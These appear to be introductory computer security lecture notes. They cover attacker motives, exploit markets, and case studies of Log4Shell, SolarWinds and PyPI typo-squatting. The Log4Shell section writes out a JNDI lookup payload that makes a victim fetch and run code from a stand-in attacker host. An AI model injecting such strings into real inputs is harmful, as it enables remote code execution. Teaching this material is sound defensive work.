# Computer and Network Security: Overview

## The computer security problem

* Lots of buggy software
* Money can be made from finding and exploiting vulns
    - Marketplace for exploits (gaining a foothold)
    - Marketplace for malware (post-compromise)
    - Strong economic and political motivation for using both
* Current state:
    - Existence of vulns is somewhat evenly distributed across OS's
    - Usage of exploits: almost 50% start by attacking Microsoft Office; 32% start by attacking the browser

## Course goals

* Understand exploit techniques
    - Learn to defend and prevent common exploits
* Understand available security tools
* Learn to architect secure systems

## This course

* Part 1: basics (architecting for security)
    - Securing apps, OS, and legacy code: sandboxing, access control, and security testing
* Part 2: Web security (defending against a web attacker)
    - Building robust websites, understanding the browser security model
* Part 3: network security (defending against a network attacker)
    - Monitoring and architecting secure networks
* Part 4: securing mobile applications

# Course introduction: what motivates attackers?

## Why compromise machines? Examples

1. Steal user credentials
    - Keylog for banking passwords, corporate passwords, gaming passwords
    - e.g. SilentBanker: Adversary-in-the-Browser (AITB) attack; finSpy on mobile devices
2. Ransomware
    - Encrypts files on disk, requests payment (typically in cryptocurrency) to unlock
    - e.g. WannaCry (2017), weaponizing the EternalBlue Windows SMB exploit
3. Cryptocurrency mining
    - Malware trojans deploy cryptocurrency miners on end-user host systems to create powerful botnets; generates profit for hackers

## Why server-side attacks?

1. Data theft
    - Can steal credit card numbers, intellectual property, etc
    - e.g. Equifax (2017): ~143M "customer" data impacted"
        - Exploited known remote code execution (RCE) vulnerability in Apache Struts
    - Many such attacks since 2000
2. Political motivation
    - e.g. attack on DNC (2015)
    - e.g. Ukraine attacks: 2014 election, 2015-2016 power grid, 2017 NotPetya, ...
3. Infect visiting users: see above

## Typical attack steps (Cyber Kill Chain)

1. Reconnnaissance
2. Foothold: initial breach
3. Internal reconnaissance
4. Lateral movement
5. Data extraction
6. Exfiltration

## Case study: Log4Shell (2021)

* Log4j: popular logging framework for Java
    - Nov. 2021: vulnerability in Log4j v2 enables RCE
    - Over 7000 code repositories affected
* Bug:
    - Log4j can load and run code to process a log request
    - Attacker sends a message containing `${jndi:ldap://attacker.com}` to the victim
    - Victim runs `log.info("...${jndi:ldap://attacker.com}...")`
    - Victim will then HTTP GET the code at `ldap://attacker.com` and run it: allowing malicious Java code
* Exploitation:
    - Khonsari ransomware
    - XMRIG cryptominer
    - Orcus remote access trojan
* Preventing problems of this type:
    - Isolation: sandbox Log4j library or sandbox entire application

## Case study: SolarWinds Orion (2020)

* SolarWinds Orion: set of monitoring tools used by many organizations
* Attack (Feb. 20, 2020):
    - Attacker corrupts SolarWinds software update process using sunburst malware
    - Infected DLL distributed to customers, allowing remote access to customer sites
* Large number of infected organizations, not detected until Dec. 2020
* How did attacker corrupt the SolarWinds build process?
    - `taskhostsvc.exe` runs on SolarWinds build system:
        - Monitors for processes running `MsBuild.exe` (Visual Studio)
        - If found, read cmd line args to test if Orion software being built
        - If so:
            - Replace file `InventoryManager.cs` with malware version, backup original to `InventoryManager.bk`
            - When `MsBuild.exe` exits, restore original file, no trace left
* Fallout:
    - Large number of orgs and government systems exposed for many months
    - More generally: supply chain attack - hardware, software or service supplier is compromised -> many compromised customers
        - Many examples of this in the past (e.g., Target 2013 hack)

## Case study: typo squatting

* `pip`: Package installer from python
    - Usage: `pip install 'SomePackage >= 2.3'`
    - By default: installs from PyPi (Python Package Index at pypi.org)
        - PyPi hosts over 300,000 projects
* Security considerations: dependencies
    - Package maintainer can inject code into your environment
    - Supply chain attack: attack on package manager -> compromise dependent projects
* Security considerations: typo-squatting
    - The risk: malware packages with a similar name to a popular package; unsuspecting developers install the wrong package
    - e.g. `urllib3` is a package to parse urls, `urlib3` is a malware package
    - e.g. `python-nmap` is a net scanning package, `nmap-python` is a malware package
    - From 2017-2020, over 40 such incidents discovered on PyPi

# Course introduction: The Marketplace for Vulnerabilities

## Bug bounty programs

* Google: Up to $31,337
* Microsoft: Up to $100k
* Apple: Up to $200K
* Stanford: up to $1k
* Pwn2Own: $15k

## Exploit brokers

* Zerodium: up to $2M for iOS, $2.5M for Android (2019); clients are government organizations
* These groups are primarily interested in RCE, local privilege escalation (LPE), and sandbox escape (SBX)
